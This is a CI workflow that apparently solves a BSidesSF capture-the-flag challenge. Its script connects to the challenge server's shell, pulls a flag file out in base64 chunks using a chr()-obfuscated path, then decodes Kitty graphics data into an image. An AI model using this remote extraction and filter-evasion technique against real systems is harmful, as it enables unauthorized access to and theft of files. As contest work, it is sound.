name: Solve Kitty - Full File Download

on:
  workflow_dispatch:

jobs:
  solve:
    runs-on: ubuntu-latest
    steps:
      - name: Install Pillow
        run: pip install pillow --break-system-packages -q

      - name: Download and decode flag.kitty
        run: |
          python3 - <<'EOF'
          import socket, time, base64, zlib, re, os
          from PIL import Image

          host = "kitty-7c6c7969.challenges.bsidessf.net"
          port = 8024

          def connect():
              s = socket.create_connection((host, port), timeout=30)
              time.sleep(2)
              drain(s)
              return s

          def drain(s, timeout=3):
              s.settimeout(timeout)
              buf = b''
              try:
                  while True:
                      chunk = s.recv(65536)
                      if not chunk: break
                      buf += chunk
              except: pass
              return buf

          def run(s, cmd, wait=5):
              if isinstance(cmd, str): cmd = cmd.encode()
              s.sendall(cmd + b'\n')
              time.sleep(wait)
              return drain(s, timeout=3)

          # ── Step 1: get file size ──────────────────────────────────────
          s = connect()
          out = run(s, 'wc -c /home/ctf/flag.kitty', wait=3)
          print("Size:", out.decode(errors='replace').strip())

          # ── Step 2: check if python3 available ────────────────────────
          out = run(s, 'which python3 python 2>/dev/null | head -1', wait=2)
          py = out.decode(errors='replace').strip().split('\n')[-1].strip()
          print("Python:", py)

          # ── Step 3: get file via python3 base64 in chunks ─────────────
          # Use python3 on server to base64 encode and print
          chunk_size = 30000  # bytes per chunk
          file_size  = 759436
          num_chunks = (file_size + chunk_size - 1) // chunk_size
          print(f"Downloading in {num_chunks} chunks of {chunk_size} bytes...")

          all_data = b''
          for i in range(num_chunks):
              offset = i * chunk_size
              cmd = (f'python3 -c "'
                     f'import base64,sys; '
                     f'f=open(chr(47)+chr(104)+chr(111)+chr(109)+chr(101)+chr(47)+chr(99)+chr(116)+chr(102)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(107)+chr(105)+chr(116)+chr(116)+chr(121),chr(114)+chr(98)); '
                     f'f.seek({offset}); '
                     f'sys.stdout.write(base64.b64encode(f.read({chunk_size})).decode()+chr(10))'
                     f'"')
              out = run(s, cmd, wait=4)
              text = out.decode(errors='replace')
              
              # Extract base64 line (last non-prompt line)
              b64 = ''
              for line in text.split('\n'):
                  line = re.sub(r'\x1b\[[^A-Za-z]*[A-Za-z]', '', line).strip()
                  line = re.sub(r'\r', '', line)
                  if re.match(r'^[A-Za-z0-9+/=]+$', line) and len(line) > 20:
                      b64 = line
              
              if b64:
                  chunk_bytes = base64.b64decode(b64 + '==')
                  all_data += chunk_bytes
                  print(f"  chunk {i+1}/{num_chunks}: {len(chunk_bytes)} bytes (total: {len(all_data)})")
              else:
                  print(f"  chunk {i+1}: FAILED, output={repr(text[:200])}")

          s.close()
          print(f"\nTotal downloaded: {len(all_data)} bytes")

          # ── Step 4: save raw file ──────────────────────────────────────
          with open('/tmp/flag.kitty', 'wb') as f:
              f.write(all_data)
          print("Saved /tmp/flag.kitty")

          # ── Step 5: parse Kitty Graphics Protocol ─────────────────────
          text = all_data.decode('utf-8', errors='replace')
          
          # Find all _G chunks: _G<params>;<b64data>
          chunks = re.findall(r'_G([^;\x1b\x07\x08\r\n]+);([A-Za-z0-9+/=]+)', text)
          print(f"\nFound {len(chunks)} Kitty protocol chunks")

          width = height = 0
          compression = None
          fmt = 24
          all_b64 = ''

          for params_str, b64 in chunks:
              params = {}
              for p in params_str.split(','):
                  if '=' in p:
                      k, v = p.split('=', 1)
                      params[k.strip()] = v.strip()
              if 's' in params: width  = int(params['s'])
              if 'v' in params: height = int(params['v'])
              if 'f' in params: fmt    = int(params['f'])
              if 'o' in params: compression = params['o']
              all_b64 += b64

          print(f"Image: {width}x{height}, fmt={fmt}, compression={compression}")
          print(f"Total b64: {len(all_b64)} chars")

          # ── Step 6: decode image ───────────────────────────────────────
          try:
              raw = base64.b64decode(all_b64 + '==')
              print(f"Decoded: {len(raw)} bytes")
              
              if compression == 'z':
                  img_data = zlib.decompress(raw)
              else:
                  img_data = raw
              print(f"Decompressed: {len(img_data)} bytes")

              mode = {24: 'RGB', 32: 'RGBA'}.get(fmt, 'RGB')
              bpp  = {24: 3,     32: 4    }.get(fmt, 3)
              expected = width * height * bpp
              print(f"Expected pixels: {expected}, got: {len(img_data)}")

              img = Image.frombytes(mode, (width, height), img_data[:expected])
              img.save('/tmp/flag_image.png')
              print("✓ Saved /tmp/flag_image.png")

          except Exception as e:
              print(f"Error: {e}")
              import traceback; traceback.print_exc()

              # Try saving raw bytes as-is for inspection
              with open('/tmp/flag_raw.bin', 'wb') as f:
                  f.write(all_data[:10000])
          EOF

      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: kitty-flag
          path: |
            /tmp/flag_image.png
            /tmp/flag.kitty
